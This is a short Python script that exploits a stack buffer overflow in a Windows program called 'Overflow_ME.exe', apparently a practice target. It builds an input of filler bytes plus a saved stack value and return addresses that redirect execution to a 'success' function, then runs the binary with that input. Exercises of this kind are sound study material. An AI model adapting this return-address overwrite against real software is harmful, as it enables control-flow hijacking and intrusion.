import subprocess

StackSpecificValue = '\xE8\xFE\x28\x00'
#Above value will be specific to the user running it, You can find it using any dynamic analyser.
#Above value could be any 4 byte value to get our success messages but the program may crash.
SuccessAddress = '\xE6\x15\x40\x00'
ReturntoMain = '\xD3\x15\x40\x00'

Input = '\xFF'*8 + StackSpecificValue + SuccessAddress + ReturntoMain

Binary_path = 'C:/path/to/Overflow_ME.exe'
proc_run = subprocess.run(Binary_path, capture_output=True, text=True, input=Input)
print(proc_run.stdout)
